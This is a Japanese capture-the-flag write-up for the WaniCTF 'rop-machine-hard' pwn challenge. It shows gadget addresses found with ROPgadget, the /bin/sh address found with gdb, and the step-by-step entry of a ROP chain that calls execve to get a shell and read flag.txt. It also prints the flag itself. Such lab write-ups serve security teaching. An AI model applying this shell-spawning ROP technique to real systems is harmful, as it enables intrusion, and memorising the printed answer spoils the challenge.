# rop-machine-hard [pwn]
## 問題文

```
nc rop-hard.pwn.wanictf.org 9005
```

### ヒント

+ ROPgadgetコマンドの使い方を覚えましょう。
+ rop machineの使い方->[wani-hackase/rop-machine](https://github.com/wani-hackase/rop-machine/)


### 使用ツール例
+ [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)
+ [ROPgadget](https://github.com/wani-hackase/memo-setup-pwn-utils#ROPgadget)

### gccのセキュリティ保護

+ *Partial RELocation ReadOnly (RELRO)*
+ Stack Smash Protection (SSP)有効
+ No eXecute bit(NX)有効
+ *Position Independent Executable (PIE)無効*

## FLAG

```
FLAG{y0ur-next-step-is-to-use-pwntools}
```


## 解法

### はじめに

04 rop machine normalのをROPgadgetで実際にアドレスを調べてそのアドレスと値を積んでいくだけです。
これができればROPの作り方はほぼほぼマスターと言っていいのではと思います。
正答者数も04 rop machine normalの80～90%だったのでちょうどよかったかと思います。

#### アドレス調べ

`ROPbadget --binary ./pwn05`でgadgetのアドレスを調べます。

```
0x000000000040128f : pop rdi ; ret
0x00000000004012a9 : pop rax ; ret
0x000000000040129c : pop rdx ; ret
0x0000000000401611 : pop rsi ; pop r15 ; ret
0x00000000004012b6 : syscall
```

`pop rsi ; pop r15 ; ret`だけが前のガジェットと少し違います。


`/bin/sh`が入っているアドレスを調べる方法ですが、stringsとかobjdumpとかで調べることもあるのですが、gdbが一番楽かもです。
gdbでpwn05を起動してstartして`p &binsh`でアドレスが分かります。

```
$ gdb ./pwn05
(gdb) start
Temporary breakpoint 1 at 0x40157e
Starting program: /home/saru/2021/wanictf2021s-challenge/pwn/05-rop-machine-hard/file/pwn05

Temporary breakpoint 1, 0x000000000040157e in main ()
(gdb) p &binsh
$1 = (<data variable, no debug info> *) 0x404078 <binsh>
(gdb)
```

#### rop machineへの入力

あとはこれらのアドレスを組み合わせてROPを組むだけです。

```
$ nc rop-hard.pwn.wanictf.org 9005

[menu]
1. append hex value
8. show menu (this one)
9. show rop_arena
0. execute rop
> 1
hex value?: 40128f
0x000000000040128f is appended
> 1
hex value?: 404078
0x0000000000404078 is appended
> 1
hex value?: 40129c
0x000000000040129c is appended
> 1
hex value?: 0
0x0000000000000000 is appended
> 1
hex value?: 401611
0x0000000000401611 is appended
> 1
hex value?: 0
0x0000000000000000 is appended
> 1
hex value?: 0
0x0000000000000000 is appended
> 1
hex value?: 4012a9
0x00000000004012a9 is appended
> 1
hex value?: 3b
0x000000000000003b is appended
> 1
hex value?: 4012b6
0x00000000004012b6 is appended
> 0
     rop_arena
+--------------------+
| 0x000000000040128f |<- rop start
+--------------------+
| 0x0000000000404078 |
+--------------------+
| 0x000000000040129c |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| 0x0000000000401611 |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| 0x00000000004012a9 |
+--------------------+
| 0x000000000000003b |
+--------------------+
| 0x00000000004012b6 |
+--------------------+
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{y0ur-next-step-is-to-use-pwntools}
^C
(base) saru@saru-cf-rz:~/2021/wanictf2021s-challenge/pwn/05-rop-machine-hard/file
$
```
